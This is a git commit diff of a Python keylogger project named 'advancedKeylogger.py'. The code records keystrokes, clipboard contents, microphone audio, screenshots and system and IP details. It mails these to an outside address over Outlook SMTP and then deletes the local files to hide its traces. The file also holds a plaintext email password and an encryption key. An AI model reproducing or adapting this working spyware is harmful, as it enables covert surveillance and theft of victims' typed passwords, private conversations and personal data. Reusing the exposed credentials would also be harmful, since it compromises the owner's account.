c97aa755a8b6241b18c5fd68ace7281ac2c4b5a3
DanielaAmu000 <danielaamu7@gmail.com>
2023-07-25 15:14:08 -0500

    second commit

--- Project/advancedKeylogger.py
+++ Project/advancedKeylogger.py
@@ -1,32 +1,24 @@
-#Libraries 
-
+# Libraries
+import os
+import socket
+import platform
+import getpass
+import time
+import smtplib
+import sounddevice as sd
+from PIL import ImageGrab
+from requests import get
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-import smtplib
-
-import socket
-import platform
-
+from multiprocessing import Process, freeze_support
+from pynput.keyboard import Key, Listener
+from scipy.io.wavfile import write
+from cryptography.fernet import Fernet
 import win32clipboard
 
-from pynput.keyboard import Key, Listener
-
-import time
-import os
-
-from scipy.io.wavfile import write
-import sounddevice as sd
-
-from cryptography.fernet import Fernet
-
-import getpass
-from requests import get
-
-from multiprocessing import Process, freeze_support
-from PIL import ImageGrab
-
+# Global Variables
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
 clipboard_information = "clipboard.txt"
@@ -35,221 +27,145 @@ time_iteration = 15
 number_of_iterations_end = 3
 audio_information = "audio.wav"
 screenshot_information = "screenshot.png"
+print("System initialize" + str(time.time()))
 
-
-keys_information_e = "key_log.txt"
+keys_information_e = "e_key_log.txt"
 system_information_e = "e_systeminfo.txt"
 clipboard_information_e = "e_clipboard.txt"
 
 email_address = "userattch2023@outlook.com"
 password = "yihkwprettuxwxgw"
-
-
 username = getpass.getuser()
-
 toaddr = "user.attch@gmail.com"
-
 key = "s-bIgdAv5W40sFub7iBRCrk9JDEsyXZmJ3DRc2ND6Ok="
 
 file_path = "C:\\Users\\danie\\Desktop\\KEYLOGGER\\Project"
 extend = "\\"
 file_merge = file_path + extend
+with open(file_path + extend + keys_information, "w") as f:
+    f.write(" ")
 
-
-
-# Funcionalidad email 
-
+# Email Functionality
 def send_email(filename, attachment, toaddr):
-
     fromaddr = email_address
-
     msg = MIMEMultipart()
-
     msg['From'] = fromaddr
-
-    msg ['To'] = toaddr
-
-    msg ['Subject'] = "Log File"
-
+    msg['To'] = toaddr
+    msg['Subject'] = "Log File"
     body = "Body_of_the_mail"
-
     msg.attach(MIMEText(body, 'plain'))
-
-    filename = filename
     attachment = open(attachment, "rb")
-    
-    #Adjuntar
 
     p = MIMEBase('application', 'octet-stream')
-
     p.set_payload((attachment).read())
-
     encoders.encode_base64(p)
-
     p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-
     msg.attach(p)
 
-    #Definir sesión SMTP
-
     s = smtplib.SMTP('smtp-mail.outlook.com', 587)
-
     s.starttls()
-
     s.login(fromaddr, password)
 
     text = msg.as_string()
-
     s.sendmail(fromaddr, toaddr, text)
-
     s.quit()
 
-send_email(keys_information, file_path + extend + keys_information, toaddr)
-
-#Obtener información del ordenador 
-
+# Computer Information
 def computer_information():
-    with open(file_path + extend + system_information, "a") as f: 
+    with open(file_path + extend + system_information, "a") as f:
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
-        try: 
+        try:
             public_ip = get("https://api.ipify.org").text
             f.write("Public IP Address: " + public_ip)
-        
         except Exception:
             f.write("Couldn't get Public IP Address")
-
-        f.write(" Processor: " + (platform.processor()) + '\n' )
+        f.write(" Processor: " + (platform.processor()) + '\n')
         f.write("System: " + platform.system() + "" + platform.version() + '\n')
         f.write("Machine: " + platform.machine() + '\n')
-        f.write("Hostname: " + hostname + "\n")
+        f.write("Hostname: " + hostname + '\n')
         f.write("Private IP Address " + IPAddr + '\n')
 
-computer_information()
-
-#Obtener información del portapapeles
+# Clipboard Information
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
-        try: 
+        try:
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
-
             f.write("Clipboard Data: \n" + pasted_data)
-
         except:
             f.write("Clipboard could not be copied")
 
-copy_clipboard()
-
-#Micrófono
-
+# Microphone
 def microphone():
     fs = 44100
     seconds = microphone_time
-
     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
     sd.wait()
-
     write(file_path + extend + audio_information, fs, myrecording)
 
-microphone()
-
-
-#Tomar captura de pantalla
+# Screenshot
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_information)
 
-screenshot()
+# Keylogger Functions
+def on_press(key):
+    global keys, count, currentTime
+    keys.append(key)
+    count += 1
+    currentTime = time.time()
 
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+    if currentTime > stoppingTime:
+        return False
+
+# Timer for Keylogger
 number_of_iterations = 0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
 
-
-#Timer para el keylogger
-while number_of_iterations < number_of_iterations_end: 
-
+while number_of_iterations < number_of_iterations_end:
     count = 0
     keys = []
 
-    def on_press(key):
-        global keys, count, currentTime
-
-        print(key)
-        keys.append(key)
-        count += 1
-        currentTime = time.time()
-
-        if count >= 1:
-            count = 0
-            write_file(keys)
-            keys = []
-
-
-    def write_file(keys):
-        with open(file_path + extend + keys_information, "a") as f:
-            for key in keys:
-                k = str(key).replace("'", "")
-                if k.find("space") > 0:
-                    f.write('\n')
-                    f.close()
-                elif k.find("Key") == -1:
-                    f.write(k)
-                    f.close()
-
-
-    def on_release(key):
-        if key == Key.esc:
-            return False
-        if currentTime > stoppingTime:
-            return False
-        
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
+
     if currentTime > stoppingTime:
-        
         with open(file_path + extend + keys_information, "w") as f:
             f.write(" ")
-        
+
         screenshot()
         send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
-        copy_clipboard()
 
         number_of_iterations += 1
-
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
 
-
-#Encriptar archivos
-# files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information ]
-# encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
-
-# count = 0 
-
-# for encrypting_file in files_to_encrypt:
-
-#     with open(files_to_encrypt[count], 'rb') as f:
-#         data = f.read()
-    
-#     fernet = Fernet(key)
-#     encrypted = fernet.encrypt(data)
-    
-#     with open(encrypted_file_names[count], 'wb') as f:
-#         f.write(encrypted)
-    
-#     send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
-#     count += 1
-
-
-time.sleep(120)
-
-#Limpiar huellas y borrar archivos
-
+#time.sleep(30)
+send_email(audio_information, file_path + extend + audio_information, toaddr)
+send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
+send_email("key_log.txt", file_path + extend + keys_information, toaddr)
+# Clean up and delete files
 delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
 
 for file in delete_files:
-
     os.remove(file_merge + file)
